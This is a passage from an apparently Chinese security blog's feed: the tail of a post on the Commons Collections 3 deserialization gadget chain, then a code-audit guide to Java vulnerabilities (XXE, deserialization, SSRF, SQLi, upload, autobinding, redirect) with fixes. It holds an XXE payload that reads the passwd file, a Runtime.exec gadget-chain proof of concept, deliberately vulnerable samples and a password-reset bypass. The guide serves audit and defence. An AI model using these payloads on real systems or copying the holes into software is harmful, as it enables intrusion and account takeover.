methodName;</span><br><span class="line">this.iParamTypes = paramTypes;</span><br><span class="line">this.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以数组中三个的InvokerTransformer元素，会把其参数列表中的参数依次根据其构造方法赋值给其内部的iMethodName、iParamTypes、iArgs成员变量。</p><blockquote><p>例如第一个InvokerTransformer元素的参数是：”getMethod”, new Class[]{String.class, Class[].class}, new Object[]{“getRuntime”, new Class[0]}），一共三个参数。所以会调用InvokerTransformer类中具有三个参数的构造方法。然后将”getMethod”赋值给iMethodName、将new Class[]{String.class, Class[].class}赋值给iParamTypes、将new Object[]{“getRuntime”, new Class[0]}）赋值给iArgs。</p></blockquote><p>而这三个成员变量恰恰是transform中动态调用的重要依据。</p><p>然后我们分析第二部分代码，第一步的目的也很清晰，就是用transformers数组来实例化成一个ChainedTransformer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer transformeredChain = new ChainedTransformer(transformers);</span><br><span class="line">        // 构成调用链：((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;,&quot;value&quot;);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap,null,transformeredChain);</span><br><span class="line">        Map.Entry entry =(Map.Entry)transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;test&quot;);</span><br></pre></td></tr></table></figure><p>虽然构建一个HashMap类，随便给他设置了一个键值对value-value。</p><blockquote><p>这里写Java的朋友说HashMap其实可以简单理解成python里面的字典。</p></blockquote><p>然后代码通过TransformedMap.decorate()方法，获得一个TransformedMap。随后我们通过entry来遍历整个HashMap获取里面的元素。然后我们只要把其中一个键值对改变，就会像第二篇章说的一样：触发transformeredChain（即transformers数组）中每个元素的transform方法，从而利用transform中的反射获取需要的类方法并因为transformeredChain的多次调用而构成一整条调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc.exe&quot;));</span><br></pre></td></tr></table></figure><blockquote><p>调用：使用了反射特性；链：根据transformeredChain中的多次调用形成调用链；触发点：TransformedMap中的键值对被改变。</p></blockquote><p>我们可以做个简单实验，只要注释掉重新赋值value的语句entry.setValue(“test”)，代码并不触发：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/6.png" alt></p><p>去掉注释就会触发调用链重新打开计算器了：</p><p><img src="/2020/07/19/CommonsCollections3%E5%88%A9%E7%94%A8%E9%93%BE/7.png" alt></p><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这里只是梳理了Commons Collections3这条链的前因后果，因为写的头昏眼花啦，这篇等我后面再补齐剩余的内同。然后就是找到Java触发反序列化的点简单，关键是如何<strong>找到可利用的调用链</strong>。这个作为最经典的一条调用链，我就先说到这里了。下次继续补齐并写其他调用链。</p><p>参考链接:</p><p> <a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a> </p><p> <a href="https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/" target="_blank" rel="noopener">https://blog.0kami.cn/2019/10/24/study-java-deserialized-commonscollections3-1/</a> </p><p> <a href="https://www.cnblogs.com/GISQZC/p/5809019.html" target="_blank" rel="noopener">https://www.cnblogs.com/GISQZC/p/5809019.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CommonsCollections3利用链&quot;&gt;&lt;a href=&quot;#CommonsCollections3利用链&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections3利用链&quot;&gt;&lt;/a&gt;CommonsCollections3利
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java敏感函数</title>
    <link href="http://bai-ren-1.github.io/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/"/>
    <id>http://bai-ren-1.github.io/2020/07/16/Java%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0/</id>
    <published>2020-07-16T13:31:34.000Z</published>
    <updated>2020-07-16T13:37:46.612Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java敏感函数"><a href="#Java敏感函数" class="headerlink" title="Java敏感函数"></a>Java敏感函数</h1><p>因为最近开发插件见到了很多敏感函数，记录记录。</p><h2 id="0x00-XXE"><a href="#0x00-XXE" class="headerlink" title="0x00 XXE"></a>0x00 XXE</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。文档类型定义(DTD)的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><ul><li>内部声明DTD:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><ul><li>引用外部DTD:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>当允许引用外部实体时，恶意攻击者即可构造恶意内容访问服务器资源,如读取passwd文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE replace [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY test SYSTEM "file:///ect/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以org.dom4j.io.SAXReader为例，仅展示部分代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String xmldata = request.getParameter(<span class="string">"data"</span>);</span><br><span class="line">SAXReader sax = <span class="keyword">new</span> SAXReader();</span><br><span class="line"><span class="comment">// 创建一个SAXReader对象</span></span><br><span class="line">Document document = sax.read(<span class="keyword">new</span> ByteArrayInputStream(xmldata.getBytes()));</span><br><span class="line"><span class="comment">// 获取document对象,如果文档无节点，则会抛出Exception提前结束</span></span><br><span class="line">Element root = document.getRootElement(); <span class="comment">//获取根节点</span></span><br><span class="line">List rowList = root.selectNodes(<span class="string">"//msg"</span>);</span><br><span class="line">Iterator&lt;?&gt; iter1 = rowList.iterator();</span><br><span class="line"><span class="keyword">if</span> (iter1.hasNext()) &#123;</span><br><span class="line">    Element beanNode = (Element) iter1.next();</span><br><span class="line">    modelMap.put(<span class="string">"success"</span>,<span class="keyword">true</span>);</span><br><span class="line">    modelMap.put(<span class="string">"resp"</span>,beanNode.getTextTrim());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="审计函数"><a href="#审计函数" class="headerlink" title="审计函数"></a>审计函数</h3><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可留意下XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">org.dom4j.io.SAXReader </span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">javax.xml.transform.sax.SAXSource </span><br><span class="line">javax.xml.transform.TransformerFactory </span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory </span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XPathExpression</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>使用XML解析器时需要设置其属性，禁止使用外部实体，以上例中SAXReader为例，安全的使用方式如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sax.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">sax.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">sax.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>其它XML解析器的安全使用可参考<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet#Java" target="_blank" rel="noopener">OWASP XML External Entity (XXE) Prevention Cheat Sheet</a></p><h2 id="0x01-反序列化漏洞"><a href="#0x01-反序列化漏洞" class="headerlink" title="0x01 反序列化漏洞"></a>0x01 反序列化漏洞</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 </p><p>Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h3 id="漏洞示例-1"><a href="#漏洞示例-1" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>漏洞代码示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//读取输入流,并转换对象</span></span><br><span class="line">InputStream in=request.getInputStream();</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(in);</span><br><span class="line"><span class="comment">//恢复对象</span></span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure><p>上述代码中，程序读取输入流并将其反序列化为对象。此时可查看项目工程中是否引入可利用的commons-collections 3.1、commons-fileupload 1.3.1等第三方库，即可构造特定反序列化对象实现任意代码执行。相关三方库及利用工具可参考ysoserial、marshalsec。</p><h3 id="审计函数-1"><a href="#审计函数-1" class="headerlink" title="审计函数"></a>审计函数</h3><p>反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁盘或DB存储等业务场景,在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">JSON.parseObject</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>如果可以明确反序列化对象类的则可在反序列化时设置白名单，对于一些只提供接口的库则可使用黑名单设置不允许被反序列化类或者提供设置白名单的接口，可通过Hook函数resolveClass来校验反序列化的类从而实现白名单校验，示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AntObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AntObjectInputStream</span><span class="params">(InputStream inputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 只允许反序列化SerialObject class</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(SerialObject<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                    <span class="string">"Unauthorized deserialization attempt"</span>,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以使用Apache Commons IO Serialization包中的ValidatingObjectInputStream类的accept方法来实现反序列化类白/黑名单控制，如果使用的是第三方库则升级到最新版本。更多修复方案可参考<a href="https://xianzhi.aliyun.com/forum/topic/41/" target="_blank" rel="noopener">浅谈Java反序列化漏洞修复方案</a>。</p><h2 id="0x02-SSRF"><a href="#0x02-SSRF" class="headerlink" title="0x02 SSRF"></a>0x02 SSRF</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>SSRF形成的原因大都是由于代码中提供了从其他服务器应用获取数据的功能但没有对目标地址做过滤与限制。比如从指定URL链接获取图片、下载等。</p><h3 id="漏洞示例-2"><a href="#漏洞示例-2" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以HttpURLConnection为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">String url = request.getParameter(<span class="string">"picurl"</span>);</span><br><span class="line">StringBuffer response = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">URL pic = <span class="keyword">new</span> URL(url);</span><br><span class="line">HttpURLConnection con = (HttpURLConnection) pic.openConnection();</span><br><span class="line">con.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">con.setRequestProperty(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0"</span>);</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(con.getInputStream()));</span><br><span class="line">String inputLine;</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     response.append(inputLine);</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">modelMap.put(<span class="string">"resp"</span>,response.toString());</span><br><span class="line"><span class="keyword">return</span> <span class="string">"getimg.htm"</span>;</span><br></pre></td></tr></table></figure><h3 id="审计函数-2"><a href="#审计函数-2" class="headerlink" title="审计函数"></a>审计函数</h3><p>程序中发起HTTP请求操作一般在获取远程图片、页面分享收藏等业务场景,在代码审计时可重点关注一些HTTP请求操作函数，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HttpClient.execute</span><br><span class="line">HttpClient.executeMethod</span><br><span class="line">HttpURLConnection.connect</span><br><span class="line">HttpURLConnection.getInputStream</span><br><span class="line">URL.openStream</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h5><ul><li>使用白名单校验HTTP请求url地址</li><li>避免将请求响应及错误信息返回给用户</li><li>禁用不需要的协议及限制请求端口,仅仅允许http和https请求等</li></ul><h2 id="0x03-SQLi"><a href="#0x03-SQLi" class="headerlink" title="0x03 SQLi"></a>0x03 SQLi</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>注入攻击的本质，是程序把用户输入的数据当做代码执行。这里有两个关键条件，第一是用户能够控制输入；第二是用户输入的数据被拼接到要执行的代码中从而被执行。sql注入漏洞则是程序将用户输入数据拼接到了sql语句中，从而攻击者即可构造、改变sql语义从而进行攻击。</p><h3 id="漏洞示例-3"><a href="#漏洞示例-3" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以Mybatis框架为例，示例sql片段如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> books <span class="keyword">where</span> <span class="keyword">id</span>= $&#123;<span class="keyword">id</span>&#125;</span><br></pre></td></tr></table></figure><p>对于Mybatis框架下SQL注入漏洞的审计可参考<a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&mid=2727827368&idx=1&sn=765d0835f0069b5145523c31e8229850&mpshare=1&scene=1&srcid=0926a6QC3pGbQ3Pznszb4n2q" target="_blank" rel="noopener">Mybatis框架下SQL注入漏洞面面观</a></p><h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>Mybatis框架SQL语句安全写法应使用#{},避免使用动态拼接形式${}，ibatis则使用#变量#。安全写法如下:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> books <span class="keyword">where</span> <span class="keyword">id</span>= <span class="comment">#&#123;id&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-文件上传漏洞"><a href="#0x04-文件上传漏洞" class="headerlink" title="0x04 文件上传漏洞"></a>0x04 文件上传漏洞</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>文件上传过程中，通常因为未校验上传文件后缀类型，导致用户可上传jsp等一些webshell文件。代码审计时可重点关注对上传文件类型是否有足够安全的校验，以及是否限制文件大小等。</p><h3 id="漏洞示例-4"><a href="#漏洞示例-4" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以MultipartFile为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleFileUpload</span><span class="params">(MultipartFile file)</span></span>&#123;</span><br><span class="line">    String fileName = file.getOriginalFilename();</span><br><span class="line">    <span class="keyword">if</span> (fileName==<span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"file is error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String filePath = <span class="string">"/static/images/uploads/"</span>+fileName;</span><br><span class="line">    <span class="keyword">if</span> (!file.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            BufferedOutputStream stream =</span><br><span class="line">                    <span class="keyword">new</span> BufferedOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(filePath)));</span><br><span class="line">            stream.write(bytes);</span><br><span class="line">            stream.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"You failed to upload "</span> + file.getOriginalFilename() + <span class="string">" because the file was empty."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-3"><a href="#审计函数-3" class="headerlink" title="审计函数"></a>审计函数</h3><p>java程序中涉及到文件上传的函数，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MultipartFile</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>使用白名单校验上传文件类型、大小限制</li></ul><h2 id="0x05-Autobinding"><a href="#0x05-Autobinding" class="headerlink" title="0x05 Autobinding"></a>0x05 Autobinding</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>Autobinding-自动绑定漏洞，根据不同语言/框架，该漏洞有几个不同的叫法，如下：</p><ul><li>Mass Assignment: Ruby on Rails, NodeJS</li><li>Autobinding: Spring MVC, ASP.NET MVC</li><li>Object injection: PHP(对象注入、反序列化漏洞)</li></ul><p>软件框架有时允许开发人员自动将HTTP请求参数绑定到程序代码变量或对象中，从而使开发人员更容易地使用该框架。这里攻击者就可以利用这种方法通过构造http请求，将请求参数绑定到对象上，当代码逻辑使用该对象参数时就可能产生一些不可预料的结果。</p><h3 id="漏洞示例-5"><a href="#漏洞示例-5" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>示例代码以<a href="https://github.com/GrrrDog/ZeroNights-HackQuest-2016" target="_blank" rel="noopener">ZeroNights-HackQuest-2016</a>的demo为例，把示例中的justiceleague程序运行起来，可以看到这个应用菜单栏有about，reg，Sign up，Forgot password这4个页面组成。我们关注的点是密码找回功能，即怎么样绕过安全问题验证并找回密码。</p><p>1）首先看reset方法，把不影响代码逻辑的删掉。这样更简洁易懂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResetPasswordController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetHandler</span><span class="params">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class="line">User user = userService.findByName(username);</span><br><span class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>, user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"redirect: resetQuestion"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里从参数获取username并检查有没有这个用户，如果有则把这个user对象放到Model中。因为这个Controller使用了@SessionAttributes(“user”)，所以同时也会自动把user对象放到session中。然后跳转到resetQuestion密码找回安全问题校验页面。</p><p>2）resetQuestion密码找回安全问题校验页面有resetViewQuestionHandler这个方法展现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewQuestionHandler</span><span class="params">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome resetQuestion ! "</span> + user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用了@ModelAttribute User user，实际上这里是从session中获取user对象。但存在问题是如果在请求中添加user对象的成员变量时则会更改user对象对应成员的值。<br>所以当我们给resetQuestionHandler发送GET请求的时候可以添加“answer=hehe”参数，这样就可以给session中的对象赋值，将原本密码找回的安全问题答案修改成“hehe”。这样在最后一步校验安全问题时即可验证成功并找回密码</p><h3 id="审计函数-4"><a href="#审计函数-4" class="headerlink" title="审计函数"></a>审计函数</h3><p>这种漏洞一般在比较多步骤的流程中出现，比如转账、找密等场景，也可重点留意几个注解如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@SessionAttributes</span><br><span class="line">@ModelAttribute</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>更多信息可参考<a href="https://xianzhi.aliyun.com/forum/topic/1089/" target="_blank" rel="noopener">Spring MVC Autobinding漏洞实例初窥</a></p><h3 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h3><p>Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="0x06-URL重定向"><a href="#0x06-URL重定向" class="headerlink" title="0x06 URL重定向"></a>0x06 URL重定向</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>由于Web站点有时需要根据不同的逻辑将用户引向到不同的页面，如典型的登录接口就经常需要在认证成功之后将用户引导到登录之前的页面，整个过程中如果实现不好就可能导致URL重定向问题，攻击者构造恶意跳转的链接，可以向用户发起钓鱼攻击。</p><h3 id="漏洞示例-6"><a href="#漏洞示例-6" class="headerlink" title="漏洞示例"></a>漏洞示例</h3><p>此处以Servlet的redirect 方式为例，示例代码片段如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String site = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">if</span>(!site.isEmpty())&#123;</span><br><span class="line">response.sendRedirect(site);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="审计函数-5"><a href="#审计函数-5" class="headerlink" title="审计函数"></a>审计函数</h3><p>java程序中URL重定向的方法均可留意是否对跳转地址进行校验、重定向函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="修复方案-6"><a href="#修复方案-6" class="headerlink" 